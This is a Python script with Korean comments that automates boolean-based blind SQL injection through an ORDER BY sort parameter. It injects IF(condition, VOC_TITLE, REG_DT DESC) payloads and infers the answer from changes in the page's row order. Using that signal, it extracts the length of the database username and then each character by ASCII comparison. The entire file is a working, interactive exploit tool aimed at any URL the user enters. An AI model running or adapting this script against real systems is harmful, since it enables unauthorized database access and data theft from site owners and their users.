import requests
import string

# ---------------------------------------------------------
# SQL Injection Order By Based Extractor (Final)
# ---------------------------------------------------------

def request_sqli(url, param, condition, reference_value):
    """
    참(True)일 때: VOC_TITLE 기준으로 정렬 (reference_value가 맨 위)
    거짓(False)일 때: REG_DT DESC 기준으로 정렬 (순서가 뒤바뀜)
    """
    # 페이로드 구성 (공백 주의)
    payload = f"IF({condition},VOC_TITLE,REG_DT DESC)"
    params = {param: payload}
    
    try:
        # verify=False는 HTTPS 인증서 오류 무시용 (필요시 사용)
        response = requests.get(url, params=params, timeout=5)
        
        # 응답 본문의 상단 1000자 내에 기준 데이터가 있는지 확인
        # 정렬이 참일 때만 해당 텍스트가 상단에 위치해야 함
        return reference_value in response.text[:1000]
    except Exception as e:
        print(f"\n[!] 연결 에거: {e}")
        return False

def start_extraction():
    print("="*60)
    print("   Custom Order By SQLi Extractor (Boolean-Based)")
    print("="*60)
    
    # 1. 사용자 입력 설정
    target_url = input("[+] 대상 URL: ").strip()
    vulnerable_param = input("[+] 파라미터명 (예: sort): ").strip()
    print("\n[주의] 'sort=VOC_TITLE' 시 맨 위에 노출되는 텍스트를 입력하세요.")
    reference_value = input("[+] 기준 데이터 값: ").strip()

    print("\n[*] 서버 응답 테스트 중...")
    try:
        test_res = requests.get(target_url, timeout=5)
        print(f"[OK] 연결 성공 (Status: {test_res.status_code})")
    except:
        print("[Error] URL에 접근할 수 없습니다.")
        return

    # 2. DB Username 길이 확인
    print("[*] DB Username 길이 추출 중", end="", flush=True)
    user_length = 0
    for l in range(1, 40):
        # LENGTH(USER())=l 조건이 참일 때만 VOC_TITLE 정렬 수행
        if request_sqli(target_url, vulnerable_param, f"LENGTH(USER())={l}", reference_value):
            user_length = l
            break
        print(".", end="", flush=True)

    if user_length == 0:
        print("\n[-] 실패: 정렬 변화가 감지되지 않습니다.")
        print("    1. 참/거짓 시 데이터 순서가 실제로 바뀌는지 확인하세요.")
        print("    2. 기준 데이터 값이 응답의 앞부분에 있는지 확인하세요.")
        return

    print(f"\n[+] 확인된 길이: {user_length} 글자")

    # 3. DB Username 글자 추출
    print("[*] 데이터 추출 시작 (ASCII 대조)...")
    extracted_name = ""
    
    for i in range(1, user_length + 1):
        found = False
        # ASCII 32(공백)부터 126(~)까지 루프
        for char_code in range(32, 127):
            condition = f"ASCII(SUBSTR(USER(),{i},1))={char_code}"
            if request_sqli(target_url, vulnerable_param, condition, reference_value):
                extracted_name += chr(char_code)
                print(f"    [{i}/{user_length}] 현재 추출값: {extracted_name}")
                found = True
                break
        
        if not found:
            extracted_name += "?"
            print(f"    [{i}/{user_length}] 문자를 찾지 못함 (?)")

    print("\n" + "="*60)
    print(f"[!] 최종 결과 (DB Username): {extracted_name}")
    print("="*60)

if __name__ == "__main__":
    start_extraction()
    input("\n종료하려면 Enter를 누르세요...")
